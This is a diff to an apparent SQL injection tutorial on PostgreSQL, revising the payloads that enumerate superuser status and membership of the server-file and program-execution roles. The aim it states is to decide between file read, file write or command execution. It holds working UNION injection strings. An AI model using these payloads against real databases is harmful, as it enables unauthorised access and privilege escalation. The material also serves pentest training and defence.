@@ -24,10 +24,10 @@ A superuser can read and write server files and run programs directly. The role 
 ' UNION SELECT string_agg(rolname||':'||rolsuper::text||':'||rolcreaterole::text,','),NULL,NULL FROM pg_roles-- 
 ```
 
-On PostgreSQL 11 and later, file and program access is also granted through the predefined roles `pg_read_server_files`, `pg_write_server_files`, and `pg_execute_server_program`, so a non-superuser that belongs to one of them still reaches that primitive. Check membership:
+On PostgreSQL 11 and later, file and program access is also granted through the predefined roles `pg_read_server_files`, `pg_write_server_files`, and `pg_execute_server_program`, so a non-superuser that belongs to one of them still reaches that primitive. Test membership with `pg_has_role`, which follows nested role grants (a direct `pg_auth_members` join would miss a privilege inherited through an intermediate role):
 
 ```sql
-' UNION SELECT string_agg(r.rolname,','),NULL,NULL FROM pg_auth_members m JOIN pg_roles r ON m.roleid=r.oid JOIN pg_roles u ON m.member=u.oid WHERE u.rolname=current_user-- 
+' UNION SELECT pg_has_role('pg_read_server_files','USAGE')::text||','||pg_has_role('pg_write_server_files','USAGE')::text||','||pg_has_role('pg_execute_server_program','USAGE')::text,NULL,NULL-- 
 ```
 
 Object-level grants come from the `has_*_privilege` functions and `information_schema.role_table_grants`, for example `has_table_privilege('users','SELECT')`. Knowing the role and its grants tells you whether to pursue file read, file write, command execution, or to stay with pure data extraction.
